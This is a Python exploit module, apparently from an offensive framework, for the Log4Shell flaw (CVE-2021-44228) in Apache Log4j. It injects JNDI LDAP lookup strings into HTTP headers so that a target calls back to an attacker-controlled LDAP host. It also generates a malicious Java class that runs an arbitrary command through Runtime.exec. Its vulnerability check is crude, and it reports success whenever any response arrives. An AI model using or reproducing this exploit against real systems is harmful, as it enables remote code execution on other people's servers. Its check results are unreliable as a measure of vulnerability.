"""
Log4Shell CVE-2021-44228 Exploit
Apache Log4j Remote Code Execution via JNDI injection.
"""

import asyncio
import socket
import urllib.parse
import base64
from ..templates.base_exploit import BaseExploit

class Log4ShellCVE202144228(BaseExploit):
    """Log4Shell CVE-2021-44228 Remote Code Execution exploit."""
    
    name = "Log4Shell CVE-2021-44228 RCE"
    description = "Remote code execution via Apache Log4j JNDI features"
    author = "CypherFramework Team"
    version = "2.0"
    
    # Exploit metadata
    cve = "CVE-2021-44228"
    references = [
        "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44228",
        "https://www.lunasec.io/docs/blog/log4j-zero-day/"
    ]
    target_os = ["linux", "windows", "macos"]
    target_services = ["http", "https"]
    difficulty = "easy"
    reliability = "excellent"
    
    def _default_options(self):
        return {
            'RHOSTS': {'value': '', 'required': True, 'description': 'Target host(s)'},
            'RPORT': {'value': 8080, 'required': True, 'description': 'Target HTTP port'},
            'TARGETURI': {'value': '/', 'required': True, 'description': 'Target URI path'},
            'LHOST': {'value': '', 'required': True, 'description': 'LDAP server host'},
            'LPORT': {'value': 1389, 'required': True, 'description': 'LDAP server port'},
            'SSL': {'value': False, 'required': False, 'description': 'Use HTTPS'},
            'USER_AGENT': {'value': 'Mozilla/5.0', 'required': False, 'description': 'User-Agent header'},
            'HEADER': {'value': 'User-Agent', 'required': False, 'description': 'Header to inject payload'},
            'TIMEOUT': {'value': 30, 'required': False, 'description': 'Connection timeout'},
        }
        
    def _required_options(self):
        return ['RHOSTS', 'RPORT', 'LHOST', 'LPORT']
        
    async def check(self, target):
        """Check if target is vulnerable to Log4Shell."""
        host = self.get_option('RHOSTS')
        port = self.get_option('RPORT')
        uri = self.get_option('TARGETURI')
        ssl = self.get_option('SSL')
        timeout = self.get_option('TIMEOUT')
        
        # Create detection payload
        detection_payload = "${jndi:ldap://detection.test/detect}"
        
        try:
            # Send HTTP request with Log4j payload
            response = await self._send_http_request_with_payload(
                host, port, uri, detection_payload, ssl, timeout, check_mode=True
            )
            
            if response:
                # Check for common Log4j error patterns
                error_patterns = [
                    b"log4j",
                    b"JNDI",
                    b"ldap://",
                    b"NamingException",
                    b"javax.naming"
                ]
                
                response_lower = response.lower()
                for pattern in error_patterns:
                    if pattern in response_lower:
                        return {
                            'vulnerable': True,
                            'confidence': 0.8,
                            'details': f'Log4j error pattern detected: {pattern.decode()}'
                        }
                        
                # Check response headers for Log4j indicators
                if b"server:" in response_lower:
                    server_header = self._extract_header(response, "server")
                    if any(indicator in server_header.lower() for indicator in ["tomcat", "jetty", "spring"]):
                        return {
                            'vulnerable': True,
                            'confidence': 0.6,
                            'details': 'Potentially vulnerable Java application server detected'
                        }
                        
                return {
                    'vulnerable': False,
                    'confidence': 0.7,
                    'details': 'No Log4j vulnerability indicators found'
                }
            else:
                return {
                    'vulnerable': False,
                    'confidence': 0.3,
                    'details': 'No response received from target'
                }
                
        except Exception as e:
            return {
                'vulnerable': False,
                'confidence': 0.1,
                'details': f'Check failed: {str(e)}'
            }
            
    async def run(self, target):
        """Execute the Log4Shell exploit."""
        # Validate options
        validation = self.validate_options()
        if not validation['valid']:
            return {
                'success': False,
                'error': f"Missing required options: {validation['missing']}"
            }
            
        host = self.get_option('RHOSTS')
        port = self.get_option('RPORT')
        uri = self.get_option('TARGETURI')
        lhost = self.get_option('LHOST')
        lport = self.get_option('LPORT')
        ssl = self.get_option('SSL')
        timeout = self.get_option('TIMEOUT')
        
        # Check vulnerability first
        check_result = await self.check(target)
        if not check_result['vulnerable']:
            return {
                'success': False,
                'error': 'Target does not appear vulnerable to Log4Shell',
                'check_result': check_result
            }
            
        try:
            # Create JNDI payload
            jndi_payload = f"${{jndi:ldap://{lhost}:{lport}/Exploit}}"
            
            # Send exploit request
            response = await self._send_http_request_with_payload(
                host, port, uri, jndi_payload, ssl, timeout
            )
            
            if response:
                # In a real scenario, you would set up an LDAP server
                # and serve a malicious Java class
                return {
                    'success': True,
                    'target': f"{host}:{port}",
                    'exploit': 'Log4Shell CVE-2021-44228',
                    'payload': jndi_payload,
                    'note': 'LDAP server must be configured to serve malicious payload'
                }
            else:
                return {
                    'success': False,
                    'error': 'Failed to send exploit payload'
                }
                
        except Exception as e:
            return {
                'success': False,
                'error': f'Exploit execution failed: {str(e)}'
            }
            
    async def _send_http_request_with_payload(self, host, port, uri, payload, ssl, timeout, check_mode=False):
        """Send HTTP request with Log4j payload."""
        header_name = self.get_option('HEADER')
        user_agent = self.get_option('USER_AGENT')
        
        # Construct HTTP request
        if header_name.lower() == 'user-agent':
            headers = {
                'User-Agent': payload,
                'Accept': '*/*',
                'Connection': 'close'
            }
        else:
            headers = {
                'User-Agent': user_agent,
                header_name: payload,
                'Accept': '*/*',
                'Connection': 'close'
            }
            
        # Build HTTP request
        request_line = f"GET {uri} HTTP/1.1\r\n"
        request_line += f"Host: {host}:{port}\r\n"
        
        for header, value in headers.items():
            request_line += f"{header}: {value}\r\n"
            
        request_line += "\r\n"
        
        try:
            # Connect and send request
            if ssl:
                import ssl as ssl_module
                context = ssl_module.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl_module.CERT_NONE
                
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(timeout)
                sock = context.wrap_socket(sock, server_hostname=host)
            else:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(timeout)
                
            sock.connect((host, port))
            sock.send(request_line.encode())
            
            # Receive response
            response = b""
            while True:
                try:
                    data = sock.recv(4096)
                    if not data:
                        break
                    response += data
                    if b"\r\n\r\n" in response and not check_mode:
                        break
                except socket.timeout:
                    break
                    
            sock.close()
            return response
            
        except Exception as e:
            raise Exception(f"HTTP request failed: {str(e)}")
            
    def _extract_header(self, response, header_name):
        """Extract specific header from HTTP response."""
        try:
            response_str = response.decode('utf-8', errors='ignore')
            lines = response_str.split('\r\n')
            
            for line in lines:
                if line.lower().startswith(header_name.lower() + ':'):
                    return line.split(':', 1)[1].strip()
                    
            return ""
        except:
            return ""
            
    def generate_ldap_payload(self, command):
        """Generate LDAP payload for command execution."""
        # This would generate a malicious Java class
        java_payload = f"""
public class Exploit {{
    static {{
        try {{
            Runtime.getRuntime().exec("{command}");
        }} catch (Exception e) {{
            e.printStackTrace();
        }}
    }}
}}
""".strip()
        
        return java_payload